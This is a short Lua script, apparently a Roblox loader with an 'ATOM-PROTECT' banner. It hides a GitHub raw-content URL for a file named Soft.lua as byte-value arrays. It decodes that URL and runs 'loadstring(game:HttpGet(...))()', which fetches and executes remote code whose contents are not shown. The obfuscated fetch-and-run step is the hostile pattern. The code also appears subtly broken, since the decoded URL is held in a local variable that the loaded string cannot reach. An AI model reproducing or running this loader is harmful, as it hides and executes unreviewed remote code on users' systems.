--[[
░█████╗░████████╗░█████╗░███╗░░░███╗░░░░░░██████╗░██████╗░░█████╗░████████╗███████╗░█████╗░████████╗
██╔══██╗╚══██╔══╝██╔══██╗████╗░████║░░░░░░██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
███████║░░░██║░░░██║░░██║██╔████╔██║█████╗██████╔╝██████╔╝██║░░██║░░░██║░░░█████╗░░██║░░╚═╝░░░██║░░░
██╔══██║░░░██║░░░██║░░██║██║╚██╔╝██║╚════╝██╔═══╝░██╔══██╗██║░░██║░░░██║░░░██╔══╝░░██║░░██╗░░░██║░░░
██║░░██║░░░██║░░░╚█████╔╝██║░╚═╝░██║░░░░░░██║░░░░░██║░░██║╚█████╔╝░░░██║░░░███████╗╚█████╔╝░░░██║░░░
╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝░░░░░░╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝░╚════╝░░░░╚═╝░░░]]

local function encodeStringToNumbers(str)
	local encoded = {}
	for i = 1, #str do
		encoded[#encoded + 1] = string.byte(str:sub(i, i))
	end
	return encoded
end

local function decodeStringFromNumbers(encoded)
	local decoded = {}
	for _, code in ipairs(encoded) do
		decoded[#decoded + 1] = string.char(code)
	end
	return table.concat(decoded)
end

local function encodeLoadString(str)
	local encodedLoadString = {}
	for i = 1, #str do
		encodedLoadString[#encodedLoadString + 1] = string.byte(str:sub(i, i))
	end
	return encodedLoadString
end

local function decodeLoadString(encodedLoadString)
	local decodedLoadString = {}
	for _, code in ipairs(encodedLoadString) do
		decodedLoadString[#decodedLoadString + 1] = string.char(code)
	end
	return table.concat(decodedLoadString)
end

local encodedLoadString = encodeLoadString("loadstring(game:HttpGet(decodedData))()")
local decodedLoadString = decodeLoadString(encodedLoadString)

local encodedData = {
	104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47,
	66, 114, 105, 107, 101, 115, 116, 117, 110, 47, 50, 102, 52, 53, 55, 104, 107, 100, 51, 50, 51, 97, 116, 111, 109, 47, 109, 97, 105, 110, 47, 83, 111, 102, 116, 46, 108, 117, 97
}
local decodedData = decodeStringFromNumbers(encodedData)
loadstring(decodeLoadString(encodedLoadString))()
